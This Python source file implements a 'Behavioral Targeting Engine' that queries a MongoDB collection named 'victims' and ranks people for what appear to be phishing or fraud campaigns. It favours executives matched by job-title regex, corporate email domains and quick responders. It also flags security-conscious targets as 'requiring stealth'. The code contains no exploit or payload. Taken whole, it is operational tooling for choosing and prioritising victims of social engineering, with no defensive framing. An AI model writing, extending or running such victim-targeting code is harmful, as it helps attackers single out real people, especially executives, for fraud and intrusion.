"""
Behavioral Targeting Engine
Targeting victims based on behavioral patterns and previous interactions
"""

import os
import json
from datetime import datetime, timezone, timedelta
from typing import Dict, List, Any, Optional
import logging
from dataclasses import dataclass

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@dataclass
class BehavioralTarget:
    """Behavioral targeting criteria"""
    behavioral_patterns: List[str]
    interaction_history: List[str]
    response_patterns: List[str]
    engagement_levels: List[str]
    time_patterns: List[str]
    device_patterns: List[str]
    exclude_patterns: List[str]

class BehavioralTargetingEngine:
    """Behavioral-based targeting engine for campaigns"""
    
    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client
        
        # Behavioral patterns
        self.behavioral_patterns = {
            "high_value_targets": {
                "criteria": ["executive_level", "high_intelligence_score", "business_domain"],
                "weight": 1.0,
                "description": "Targets with high business value"
            },
            "responsive_targets": {
                "criteria": ["quick_response", "high_engagement", "multiple_interactions"],
                "weight": 0.8,
                "description": "Targets that respond quickly to campaigns"
            },
            "tech_savvy_targets": {
                "criteria": ["modern_browser", "latest_os", "multiple_devices"],
                "weight": 0.7,
                "description": "Technically sophisticated targets"
            },
            "security_conscious": {
                "criteria": ["security_software", "vpn_usage", "privacy_settings"],
                "weight": 0.6,
                "description": "Security-aware targets requiring stealth"
            },
            "mobile_users": {
                "criteria": ["mobile_device", "mobile_browser", "app_usage"],
                "weight": 0.5,
                "description": "Mobile-first users"
            },
            "business_hours": {
                "criteria": ["business_hours_access", "weekday_activity", "office_ip"],
                "weight": 0.4,
                "description": "Active during business hours"
            }
        }
        
        self.engagement_levels = {
            "high": {"threshold": 0.8, "description": "Highly engaged targets"},
            "medium": {"threshold": 0.5, "description": "Moderately engaged targets"},
            "low": {"threshold": 0.2, "description": "Low engagement targets"},
            "new": {"threshold": 0.0, "description": "New targets with no history"}
        }
        
        self.response_patterns = {
            "immediate": {"time_threshold": 300, "description": "Responds within 5 minutes"},
            "quick": {"time_threshold": 1800, "description": "Responds within 30 minutes"},
            "delayed": {"time_threshold": 7200, "description": "Responds within 2 hours"},
            "slow": {"time_threshold": 86400, "description": "Responds within 24 hours"},
            "non_responder": {"time_threshold": None, "description": "Does not respond"}
        }
    
    def initialize_targeting(self, targeting_config: Any) -> bool:
        """Initialize behavioral targeting"""
        try:
            self.target_config = targeting_config
            logger.info("Behavioral targeting initialized")
            return True
            
        except Exception as e:
            logger.error(f"Error initializing behavioral targeting: {e}")
            return False
    
    def get_target_victims(self, limit: int = 1000) -> List[Dict[str, Any]]:
        """Get victims matching behavioral criteria"""
        try:
            if not self.mongodb:
                return []
            
            collection = self.mongodb.victims
            query = {}
            
            # Build behavioral query
            behavioral_conditions = []
            
            for pattern in self.target_config.behavioral_patterns:
                pattern_info = self.behavioral_patterns.get(pattern, {})
                criteria = pattern_info.get("criteria", [])
                
                for criterion in criteria:
                    if criterion == "executive_level":
                        behavioral_conditions.append({
                            "business_intelligence.job_title": {
                                "$regex": "ceo|cfo|cto|coo|president|vp|director",
                                "$options": "i"
                            }
                        })
                    elif criterion == "high_intelligence_score":
                        behavioral_conditions.append({
                            "intelligence_score": {"$gte": 80}
                        })
                    elif criterion == "business_domain":
                        behavioral_conditions.append({
                            "email": {"$not": {"$regex": "@(gmail|yahoo|hotmail|outlook)\\.com$", "$options": "i"}}
                        })
                    elif criterion == "quick_response":
                        behavioral_conditions.append({
                            "last_response_time": {"$lte": 300}  # 5 minutes
                        })
                    elif criterion == "high_engagement":
                        behavioral_conditions.append({
                            "engagement_score": {"$gte": 0.8}
                        })
                    elif criterion == "mobile_device":
                        behavioral_conditions.append({
                            "device_type": "mobile"
                        })
                    elif criterion == "modern_browser":
                        behavioral_conditions.append({
                            "browser_version": {"$regex": "Chrome|Firefox|Safari", "$options": "i"}
                        })
            
            if behavioral_conditions:
                query["$or"] = behavioral_conditions
            
            # Filter by engagement level
            if self.target_config.engagement_levels:
                engagement_query = []
                for level in self.target_config.engagement_levels:
                    level_info = self.engagement_levels.get(level, {})
                    threshold = level_info.get("threshold", 0)
                    
                    if level == "new":
                        engagement_query.append({
                            "$or": [
                                {"engagement_score": {"$exists": False}},
                                {"engagement_score": {"$eq": 0}}
                            ]
                        })
                    else:
                        engagement_query.append({
                            "engagement_score": {"$gte": threshold}
                        })
                
                if engagement_query:
                    query["$or"] = query.get("$or", []) + engagement_query
            
            # Filter by response patterns
            if self.target_config.response_patterns:
                response_query = []
                for pattern in self.target_config.response_patterns:
                    pattern_info = self.response_patterns.get(pattern, {})
                    threshold = pattern_info.get("time_threshold")
                    
                    if pattern == "non_responder":
                        response_query.append({
                            "$or": [
                                {"last_response_time": {"$exists": False}},
                                {"last_response_time": {"$eq": None}}
                            ]
                        })
                    elif threshold:
                        response_query.append({
                            "last_response_time": {"$lte": threshold}
                        })
                
                if response_query:
                    query["$or"] = query.get("$or", []) + response_query
            
            # Exclude patterns
            if self.target_config.exclude_patterns:
                exclude_query = []
                for pattern in self.target_config.exclude_patterns:
                    if pattern == "low_engagement":
                        exclude_query.append({
                            "engagement_score": {"$lt": 0.2}
                        })
                    elif pattern == "non_responder":
                        exclude_query.append({
                            "$or": [
                                {"last_response_time": {"$exists": False}},
                                {"last_response_time": {"$eq": None}}
                            ]
                        })
                
                if exclude_query:
                    query["$and"] = exclude_query
            
            # Execute query
            cursor = collection.find(query).limit(limit)
            victims = list(cursor)
            
            logger.info(f"Found {len(victims)} victims matching behavioral criteria")
            return victims
            
        except Exception as e:
            logger.error(f"Error getting behavioral targets: {e}")
            return []
    
    def analyze_behavioral_patterns(self, victims: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Analyze behavioral patterns of victims"""
        try:
            analysis = {
                "by_engagement_level": {},
                "by_response_pattern": {},
                "by_device_type": {},
                "by_activity_time": {},
                "behavioral_insights": [],
                "total_victims": len(victims)
            }
            
            for victim in victims:
                # Analyze engagement level
                engagement_score = victim.get("engagement_score", 0)
                engagement_level = self._categorize_engagement(engagement_score)
                analysis["by_engagement_level"][engagement_level] = analysis["by_engagement_level"].get(engagement_level, 0) + 1
                
                # Analyze response pattern
                response_time = victim.get("last_response_time")
                response_pattern = self._categorize_response_time(response_time)
                analysis["by_response_pattern"][response_pattern] = analysis["by_response_pattern"].get(response_pattern, 0) + 1
                
                # Analyze device type
                device_type = victim.get("device_type", "unknown")
                analysis["by_device_type"][device_type] = analysis["by_device_type"].get(device_type, 0) + 1
                
                # Analyze activity time
                last_seen = victim.get("last_seen")
                if last_seen:
                    activity_time = self._categorize_activity_time(last_seen)
                    analysis["by_activity_time"][activity_time] = analysis["by_activity_time"].get(activity_time, 0) + 1
            
            # Generate behavioral insights
            analysis["behavioral_insights"] = self._generate_behavioral_insights(analysis)
            
            return analysis
            
        except Exception as e:
            logger.error(f"Error analyzing behavioral patterns: {e}")
            return {}
    
    def _categorize_engagement(self, engagement_score: float) -> str:
        """Categorize engagement level"""
        if engagement_score >= 0.8:
            return "high"
        elif engagement_score >= 0.5:
            return "medium"
        elif engagement_score >= 0.2:
            return "low"
        else:
            return "new"
    
    def _categorize_response_time(self, response_time: Optional[int]) -> str:
        """Categorize response time pattern"""
        if response_time is None:
            return "non_responder"
        elif response_time <= 300:
            return "immediate"
        elif response_time <= 1800:
            return "quick"
        elif response_time <= 7200:
            return "delayed"
        elif response_time <= 86400:
            return "slow"
        else:
            return "very_slow"
    
    def _categorize_activity_time(self, last_seen: datetime) -> str:
        """Categorize activity time"""
        hour = last_seen.hour
        
        if 9 <= hour <= 17:
            return "business_hours"
        elif 18 <= hour <= 22:
            return "evening"
        elif 23 <= hour or hour <= 6:
            return "night"
        else:
            return "early_morning"
    
    def _generate_behavioral_insights(self, analysis: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate behavioral insights"""
        insights = []
        
        # High engagement insight
        high_engagement = analysis["by_engagement_level"].get("high", 0)
        if high_engagement > 0:
            insights.append({
                "type": "high_engagement",
                "description": f"{high_engagement} targets show high engagement",
                "recommendation": "Prioritize for immediate targeting",
                "priority": "high"
            })
        
        # Quick response insight
        quick_responders = analysis["by_response_pattern"].get("immediate", 0) + analysis["by_response_pattern"].get("quick", 0)
        if quick_responders > 0:
            insights.append({
                "type": "quick_responders",
                "description": f"{quick_responders} targets respond quickly",
                "recommendation": "Use for time-sensitive campaigns",
                "priority": "medium"
            })
        
        # Mobile users insight
        mobile_users = analysis["by_device_type"].get("mobile", 0)
        if mobile_users > 0:
            insights.append({
                "type": "mobile_users",
                "description": f"{mobile_users} targets use mobile devices",
                "recommendation": "Optimize campaigns for mobile",
                "priority": "medium"
            })
        
        # Business hours insight
        business_hours = analysis["by_activity_time"].get("business_hours", 0)
        if business_hours > 0:
            insights.append({
                "type": "business_hours",
                "description": f"{business_hours} targets active during business hours",
                "recommendation": "Schedule campaigns during business hours",
                "priority": "low"
            })
        
        return insights
    
    def calculate_behavioral_score(self, victim: Dict[str, Any]) -> float:
        """Calculate behavioral targeting score for a victim"""
        try:
            score = 0.0
            
            # Engagement score
            engagement_score = victim.get("engagement_score", 0)
            score += engagement_score * 0.3
            
            # Response time score
            response_time = victim.get("last_response_time")
            if response_time is not None:
                if response_time <= 300:  # 5 minutes
                    score += 0.3
                elif response_time <= 1800:  # 30 minutes
                    score += 0.2
                elif response_time <= 7200:  # 2 hours
                    score += 0.1
            
            # Device type score
            device_type = victim.get("device_type", "unknown")
            if device_type == "mobile":
                score += 0.1
            elif device_type == "desktop":
                score += 0.2
            
            # Intelligence score
            intelligence_score = victim.get("intelligence_score", 0)
            score += (intelligence_score / 100) * 0.2
            
            # Business domain score
            email = victim.get("email", "")
            if not any(domain in email.lower() for domain in ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]):
                score += 0.1
            
            return min(score, 1.0)  # Cap at 1.0
            
        except Exception as e:
            logger.error(f"Error calculating behavioral score: {e}")
            return 0.0
    
    def get_targeting_recommendations(self, victims: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Get targeting recommendations based on behavioral analysis"""
        try:
            recommendations = []
            
            # Analyze behavioral patterns
            analysis = self.analyze_behavioral_patterns(victims)
            
            # High engagement recommendation
            high_engagement = analysis["by_engagement_level"].get("high", 0)
            if high_engagement > 0:
                recommendations.append({
                    "type": "high_engagement_targets",
                    "priority": "high",
                    "description": f"Found {high_engagement} high-engagement targets",
                    "action": "Prioritize for immediate campaign execution",
                    "potential_value": high_engagement * 100
                })
            
            # Quick responders recommendation
            quick_responders = analysis["by_response_pattern"].get("immediate", 0) + analysis["by_response_pattern"].get("quick", 0)
            if quick_responders > 0:
                recommendations.append({
                    "type": "quick_responders",
                    "priority": "medium",
                    "description": f"Found {quick_responders} quick-responding targets",
                    "action": "Use for time-sensitive campaigns",
                    "potential_value": quick_responders * 80
                })
            
            # Mobile users recommendation
            mobile_users = analysis["by_device_type"].get("mobile", 0)
            if mobile_users > 0:
                recommendations.append({
                    "type": "mobile_targets",
                    "priority": "medium",
                    "description": f"Found {mobile_users} mobile users",
                    "action": "Optimize campaigns for mobile devices",
                    "potential_value": mobile_users * 60
                })
            
            return recommendations
            
        except Exception as e:
            logger.error(f"Error getting targeting recommendations: {e}")
            return []
